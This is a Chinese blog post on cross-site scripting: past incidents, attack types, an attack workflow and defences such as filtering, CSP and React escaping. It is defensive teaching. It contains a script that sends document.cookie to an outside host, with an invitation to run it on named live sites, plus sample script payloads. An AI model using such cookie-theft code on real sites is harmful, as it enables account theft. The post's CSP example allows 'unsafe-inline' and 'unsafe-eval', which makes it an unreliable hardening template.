title: XSS攻击那些事儿
date: 2017-10-21
tags: XSS
categories: 编程

keywords: 前端完全, XSS
-----------------------------
&nbsp;&nbsp;&nbsp;&nbsp;2011年4月30，人人站内信遭受XSS攻击。造成人人ID、姓名、学校、手机号、QQ泄露
&nbsp;&nbsp;&nbsp;&nbsp;2011年6月28日，新浪微博遭受XSS攻击，微博用户中招后会自动向自己的粉丝发送含毒私信和微博，有人点击后会再次中毒，形成恶性循环

## 一、XSS攻击介绍
### 1.介绍
&nbsp;&nbsp;&nbsp;&nbsp;跨站脚本攻击（Cross Site Scripting）,XSS攻击通常指的是通过利用网页开发时留下的漏洞，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的
### 2.危害
&nbsp;&nbsp;&nbsp;&nbsp;据近些年OWASP(OWASP是世界上最知名的Web安全与数据库安全研究组织)统计XSS占所有web攻击的22%，高居所有web威胁榜首
<!--more-->
* 流量劫持
* 获取用户cookie信息，盗取账号
* 篡改、删除页面信息
* 配合CSRF攻击，实施进一步的攻击
* ······

## 二、XSS攻击类型
![XSS类型](xss_1.png)
### 1.存储型XSS
* 存储型XSS浏览即被触发
![XSS类型](xss_2.png)
### 2.反射型XSS
* 反射型XSS需要欺骗用户操作触发(知乎、京东已经做了转义，没有转义的情况下会被触发)
![XSS类型](xss_3.jpg)
![XSS类型](xss_4.jpg)

## 三、XSS攻击流程
### 1.寻找漏洞
* 留言系统
* 邮件系统
* 评论系统
* 富文本编辑器
上面这些都是XSS攻击的“重灾区”,因为它们都有共同点：
![XSS重灾区](xss_5.png)
### 2.构造攻击代码
![XSS攻击代码](xss_6.jpg)
![XSS攻击代码](xss_7.jpg)
### 3.注入代码
* 抓包获取提交接口信息
![XSS攻击代码](xss_8.jpg)
PS：大家不要去试了，这个漏洞已经被修复了
* Postman 修改提交数据，模拟发送
![XSS攻击代码](xss_9.jpg)
* 验证攻击是否有效
![XSS攻击代码](xss_10.png)
总结，XSS的整个流程大致如下：
![XSS攻击代码](xss_11.png)

## 四、XSS预防
### 1.特殊字符过滤
```html
<script><script>
<style></style>
a，href | events
img，src | events
style=“width: expression(xxx)”
```
推荐引入xss npm模块[http://jsxss.com/zh/index.html](http://jsxss.com/zh/index.html)

```javascript
import xss from ‘xss’;
const html = xss(‘<script>alert(“xss”)</script>’)
```
![特殊字符过滤](xss_12.png)
### 2.引入CSP
&nbsp;&nbsp;&nbsp;&nbsp;内容安全策略(Content  Security Policy)，实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。
* client设置
```html
<meta http-equiv="Content-Security-Policy" content="default-src *.meituan.com  imeituan://* *.dianping.com 'self' 'unsafe-inline' ‘unsafe-eval' ">
```
* server设置
```javascript
setHeader(‘Content-Security-Policy’, default-src *.meituan.com  imeituan://* *.dianping.com 'self' 'unsafe-inline' ‘unsafe-eval')
```
* CSP浏览器兼容性，安卓和IE支持不太理想
![CSP](xss_13.jpg)
感兴趣的话可以在[http://waimai.meituan.com](http://waimai.meituan.com)和[http://ele.me](http://ele.me)的控制台测试下面代码看看会发生什么
```javascript
function sendCookie(){
 var img = document.createElement('img');
 img.src = 'https://keycode.me?cookie=' + document.cookie;
 document.body.appendChild(img);
 document.body.removeChild(img);
}
sendCookie();
```
并不是预防了XSS，而是预防了XSS更深入的危害。CSP的具体介绍请戳[https://www.w3.org/TR/CSP1/](https://www.w3.org/TR/CSP1/)
### 3.XSS与React
&nbsp;&nbsp;&nbsp;&nbsp;React官方文档是这么说的，JSX Prevents Injection Attacks
* By default, React DOM escapes any values embedded in JSX before rendering them. Thus it ensures that you can never inject anything that's not explicitly written in your application. Everything is converted to a string before being rendered. This helps prevent XSS attacks.[https://facebook.github.io/react/docs/introducing-jsx.html](https://facebook.github.io/react/docs/introducing-jsx.html)
* 但事情也不是绝对的，在利用dangerouslySetInnerHTML注入html时也要注意过滤特殊字符
```javascript
<div dangerouslySetInnerHTML={{__html: `<script>alert(‘XSS’)</script>`}} />
```
